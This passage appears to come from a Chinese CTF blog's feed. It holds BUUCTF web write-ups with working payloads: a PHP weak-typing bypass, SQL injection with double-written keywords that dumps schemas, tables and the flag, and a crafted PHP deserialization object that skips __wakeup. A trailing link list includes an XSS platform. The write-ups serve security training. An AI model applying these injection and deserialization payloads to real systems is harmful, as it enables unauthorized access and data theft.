single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç å®¡è®¡</p><p>$keyä¸ä¸ºæ•°å­—ï¼Œä¸”ç­‰äº$str,æ˜¾ç¤ºflag</p><p>è¿™é‡Œæ¶‰åŠåˆ°phpçš„å¼±ç±»å‹ï¼Œ123==â€123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3â€</p><p>ä¼ å…¥å‚æ•°å¾—åˆ°flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadï¼š<span class="token operator">?</span>key<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 BabySQL</title>
      <link href="/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/"/>
      <url>/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>æœ‰ç™»å½•çš„ä¸€èˆ¬éƒ½ä¼šæƒ³åˆ°ä¸‡èƒ½å¯†ç ï¼Œè¿‡æ»¤äº†å¤§ä¸äº†ç»•è¿‡å§ï¼Œå’Œå‰é¢æ²¡å¤šå¤§åŒºåˆ«</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœªèƒ½æˆåŠŸï¼ŒåŒå†™ç»•è¿‡<code>or</code>è¯•è¯•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' oorr '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œç¡®å®å­˜åœ¨æ³¨å…¥ç‚¹ï¼ŒæˆåŠŸäº†ï¼Œå¼€å§‹æ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2  %23&amp;password=passwordæŠ¥é”™ï¼ŒåŒå†™union selectcheck.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>passwordThe used <span class="token keyword">SELECT</span> statements have a different number <span class="token keyword">of</span> <span class="token keyword">columns</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' ororderder by 3 %23&amp;password=2orderè¢«passäº†ï¼Œç›´æ¥æŒ¨ç€çŒœcheck.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token number">3</span>åˆ—ï¼Œå“ˆå“ˆ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,version(),database()  %23&amp;password=2//Hello 10.3.18-MariaDBï¼//Your password is '</span>geek'<span class="token comment">//å¾—åˆ°æ•°æ®åº“ç‰ˆæœ¬å’Œå½“å‰æ•°æ®åº“åç§°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†æ‰€æœ‰æ•°æ®åº“å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,2,group_concat(schema_name) frofromm infoorrmation_schema.schemata  %23&amp;password=2Hello 2ï¼Your password is '</span>information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>ctf<span class="token punctuation">,</span>geek'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ctf</code>å¯ç–‘ï¼Œçˆ†è¡¨å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whwhereere table_schema<span class="token operator">=</span><span class="token string">'ctf'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'Flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†åˆ—å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere table_name<span class="token operator">=</span><span class="token string">'Flag'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†æ•°æ®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>ctf<span class="token punctuation">.</span>Flag<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'flag{cc46361f-7094-4e08-a744-2c4c3fcc9eb0}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 PHP</title>
      <link href="/2021/03/08/ji-ke-da-tiao-zhan-2019-php/"/>
      <url>/2021/03/08/ji-ke-da-tiao-zhan-2019-php/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>é¡µé¢æç¤º<code>æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯</code></p><p>æ‰¾ä¸€ä¸ªå¤‡ä»½çš„å­—å…¸æ‰«æ‰«ç½‘ç«™ç›®å½•</p><p><img src="https://s3.ax1x.com/2021/03/08/61ZBrD.png" alt="61ZBrD.png"></p><p>ä¸‹è½½è¿™ä¸ªå‹ç¼©åŒ…<code>www.zip</code></p><p>æœ‰å‡ ä¸ªæ–‡ä»¶</p><p>class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>unserialize</code>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´</p><p><code>echo $flag</code>æ¡ä»¶æ˜¯<code>username === 'admin' and password == 100</code></p><p>ç”Ÿæˆåºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'100'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>    //å¾—åˆ°O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºäº†ç»•è¿‡<code>__wakeup</code>,æ‰§è¡Œ<code>__destruct</code>,å°†2æ”¹æˆ3ï¼ŒåŸç†ï¼šå˜é‡ä¸ªæ•°å¤§äºåŸæ¥çš„</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" Name username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" Name password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œé¢æœ‰å‡ ä¸ªç©ºæ ¼ï¼ŒæŠŠå®ƒæ¢æˆ%00ï¼ŒåŸç†ï¼šç§æœ‰å˜é‡å‰éœ€è¦åŠ ä¸ªå‰ç¼€0</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>select<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"100"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>site</title>
      <link href="/2021/03/08/site/"/>
      <url>/2021/03/08/site/</url>
      
        <content type="html"><![CDATA[<h1 id="Study-å­¦ä¹ "><a href="#Study-å­¦ä¹ " class="headerlink" title="Study_å­¦ä¹ "></a>Study_å­¦ä¹ </h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>æ…•è¯¾ï¼ˆMOOCï¼‰</td><td><a href="https://www.icourse163.org/">https://www.icourse163.org/</a></td><td></td></tr><tr><td>å®‰ç•Œç½‘</td><td><a href="https://www.ajsafe.com/">https://www.ajsafe.com/</a></td><td></td></tr><tr><td>ä¸‡é—¨å¤§å­¦</td><td><a href="https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1">https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>æ—¶å®œæœä¹¦</td><td><a href="https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1">https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>oeasy</td><td><a href="http://oeasy.org/">http://oeasy.org/</a></td><td></td></tr><tr><td>epubeeç”µå­ä¹¦</td><td><a href="http://cn.epubee.com/books/">http://cn.epubee.com/books/</a></td><td></td></tr><tr><td>é¸ æ‘©æœä¹¦</td><td><a href="https://www.jiumodiary.com/">https://www.jiumodiary.com/</a></td><td></td></tr><tr><td>è€ƒè¯•é…·</td><td><a href="https://www.examcoo.com/index/ku">https://www.examcoo.com/index/ku</a></td><td></td></tr><tr><td>æˆ‘è¦è‡ªå­¦ç½‘</td><td><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></td><td></td></tr><tr><td>æ˜¥ç§‹</td><td><a href="https://www.ichunqiu.com/">https://www.ichunqiu.com/</a></td><td></td></tr><tr><td>ç®€æœé¢˜</td><td><a href="https://www.jiansouti.com/">https://www.jiansouti.com/</a></td><td></td></tr><tr><td>ç½‘è€ƒç½‘</td><td><a href="https://www.netkao.com/">https://www.netkao.com/</a></td><td></td></tr><tr><td>ä¼˜å­¦ä¼˜è€ƒç½‘</td><td><a href="http://www.yxykw.com/">http://www.yxykw.com/</a></td><td></td></tr></tbody></table><h1 id="ä¸“ä¸š"><a href="#ä¸“ä¸š" class="headerlink" title="ä¸“ä¸š"></a>ä¸“ä¸š</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>åšå®¢å›­</td><td><a href="https://www.cnblogs.com/">https://www.cnblogs.com/</a></td><td></td></tr><tr><td>GitHub</td><td><a href="https://github.com/">https://github.com/</a></td><td></td></tr><tr><td>èœé¸Ÿæ•™ç¨‹</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr><tr><td>å¾çˆ±ç ´è§£</td><td><a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></td><td></td></tr><tr><td>stackoverflow</td><td><a href="https://stackoverflow.com/">https://stackoverflow.com/</a></td><td></td></tr><tr><td>w3school</td><td><a href="https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></td><td></td></tr><tr><td>Cè¯­è¨€</td><td><a href="https://www.dotcpp.com/">https://www.dotcpp.com/</a></td><td></td></tr><tr><td>æ…•è¯¾ç½‘</td><td><a href="https://www.imooc.com/">https://www.imooc.com/</a></td><td></td></tr><tr><td>lib4dev</td><td><a href="http://www.lib4dev.in/">http://www.lib4dev.in/</a></td><td></td></tr><tr><td>æ˜é‡‘</td><td><a href="https://juejin.im/">https://juejin.im/</a></td><td></td></tr><tr><td>oschina</td><td><a href="https://www.oschina.net/?refresh">https://www.oschina.net/?refresh</a></td><td></td></tr><tr><td>è€ç™½ï¼ˆåšå®¢ï¼‰</td><td><a href="https://oo0.bid/">https://oo0.bid/</a></td><td></td></tr><tr><td>èµ„æºç´ æç«™</td><td><a href="http://www.fxrcxjq.com/">http://www.fxrcxjq.com/</a></td><td></td></tr><tr><td>èµ„æºå¹²è´§ç«™</td><td><a href="http://xgp123.cn/">http://xgp123.cn/</a></td><td></td></tr><tr><td>MSDN</td><td><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></td><td></td></tr><tr><td>CTF</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/</a></td><td></td></tr><tr><td>CTF wiki</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a></td><td></td></tr><tr><td>é»‘å§å®‰å…¨ç½‘</td><td><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></td><td></td></tr><tr><td>ä¸‰å¶è‰</td><td><a href="https://syc-2019--fxxy.repl.co/source/web.html">https://syc-2019--fxxy.repl.co/source/web.html</a></td><td></td></tr><tr><td>Goç ´è§£</td><td><a href="https://www.gopojie.net/">https://www.gopojie.net/</a></td><td></td></tr><tr><td>é»‘é©¬ç¨‹åºå‘˜</td><td><a href="http://yun.itheima.com/">http://yun.itheima.com/</a></td><td></td></tr><tr><td>51cto</td><td><a href="https://edu.51cto.com/">https://edu.51cto.com/</a></td><td></td></tr><tr><td>è„šæœ¬ä¹‹å®¶</td><td><a href="https://www.jb51.net/">https://www.jb51.net/</a></td><td></td></tr><tr><td>xsså¹³å°</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>md5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr></tbody></table><h1 id="å›¾åº“"><a href="#å›¾åº“" class="headerlink" title="å›¾åº“"></a>å›¾åº“</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>wallhere</td><td><a href="https://wallhere.com/">https://wallhere.com/</a></td><td></td></tr><tr><td>konachan</td><td><a href="https://konachan.net/">https://konachan.net/</a></td><td></td></tr><tr><td>pixivic</td><td><a href="https://pixivic.com/?VNK=1671e864">https://pixivic.com/?VNK=1671e864</a></td><td></td></tr><tr><td>Cç«™</td><td><a href="https://cosz.net/">https://cosz.net/</a></td><td></td></tr><tr><td>å½¼å²¸å›¾åº“</td><td><a href="http://pic.netbian.com/">http://pic.netbian.com/</a></td><td></td></tr><tr><td>å›¾è™«</td><td><a href="https://tuchong.com/">https://tuchong.com/</a></td><td></td></tr><tr><td>ç”µè„‘å£çº¸</td><td><a href="http://nav.6soluo.com/pic/">http://nav.6soluo.com/pic/</a></td><td></td></tr><tr><td>wallhaven</td><td><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></td><td></td></tr><tr><td>Pixiv</td><td><a href="https://m.pixivic.com/dailyRank?VNK=beec565f">https://m.pixivic.com/dailyRank?VNK=beec565f</a></td><td></td></tr><tr><td>wallpapercave</td><td><a href="https://wallpapercave.com/">https://wallpapercave.com/</a></td><td></td></tr><tr><td>åƒå¶</td><td><a href="http://qianye88.com/">http://qianye88.com/</a></td><td></td></tr><tr><td>æç®€å£çº¸</td><td><a href="https://bz.zzzmh.cn/">https://bz.zzzmh.cn/</a></td><td></td></tr><tr><td>ACG</td><td><a href="https://2046xpro.com/">https://2046xpro.com/</a></td><td></td></tr><tr><td>å›¾ç‰‡</td><td><a href="https://www.mikuclub.org/">https://www.mikuclub.org/</a></td><td></td></tr><tr><td>å£æ¬¡å…ƒ</td><td><a href="https://www.biacgn.com/">https://www.biacgn.com/</a></td><td></td></tr><tr><td>å¤§å›¾åº“</td><td><a href="http://123.meibp.com/">http://123.meibp.com/</a></td><td></td></tr><tr><td>å¤§å”å¿ƒ</td><td><a href="https://www.dashuxin.com/">https://www.dashuxin.com/</a></td><td></td></tr></tbody></table><h1 id="å­¦æ ¡ï¼ˆï¼‰"><a href="#å­¦æ ¡ï¼ˆï¼‰" class="headerlink" title="å­¦æ ¡ï¼ˆï¼‰"></a>å­¦æ ¡ï¼ˆï¼‰</h1><table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th><th>æè¿°</th></tr></thead><tbody><tr><td>ICC</td><td><a href="http://icc.hep.com.cn/getSystemDepartmentPortal.action">http://icc.hep.com.cn/getSystemDepartmentPortal.action</a></td><td></td></tr><tr><td>å­¦ä¹ é€šï¼ˆä¸ªäººï¼‰</td><td><a href="http://i.chaoxing.com/">http://i.chaoxing.com/</a></td><td></td></tr><tr><td>å­¦ä¹ 